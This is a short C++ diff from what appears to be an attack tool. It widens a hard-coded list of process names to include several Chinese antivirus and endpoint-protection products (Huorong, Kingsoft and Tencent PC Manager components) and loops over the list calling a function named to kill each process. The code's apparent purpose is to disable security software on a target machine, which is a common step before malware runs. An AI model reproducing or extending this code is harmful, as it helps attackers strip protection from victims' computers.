@@ -286,7 +286,8 @@ int main(int argc, char* argv[])
 	{
 		//std::wstring process_list[] = {L"HipsMain.exe",L"HipsTray.exe",L"HipsDaemon.exe"};
 		//std::wstring process_list[] = { L"kscan.exe",L"kwsprotect64.exe",L"kxescore.exe" ,L"kxetray.exe"};
-		std::wstring process_list[] = { L"QMDL.exe",L"QMPersonalCenter.exe",L"QQPCPatch.exe" ,L"QQPCRealTimeSpeedup.exe",L"QQPCRTP.exe",L"QQPCTray.exe",L"QQPCTray.exe",L"QQRepair.exe" };
+		//std::wstring process_list[] = { L"QMDL.exe",L"QMPersonalCenter.exe",L"QQPCPatch.exe" ,L"QQPCRealTimeSpeedup.exe",L"QQPCRTP.exe",L"QQPCTray.exe",L"QQPCTray.exe",L"QQRepair.exe" };
+		std::wstring process_list[] = { L"kscan.exe",L"kwsprotect64.exe",L"kxescore.exe" ,L"kxetray.exe", L"HipsMain.exe",L"HipsTray.exe",L"HipsDaemon.exe",L"QMDL.exe",L"QMPersonalCenter.exe",L"QQPCPatch.exe" ,L"QQPCRealTimeSpeedup.exe",L"QQPCRTP.exe",L"QQPCTray.exe",L"QQPCTray.exe",L"QQRepair.exe" };
 		for (auto iter : process_list)
 		{
 			FuckOffProcessByName(iter);
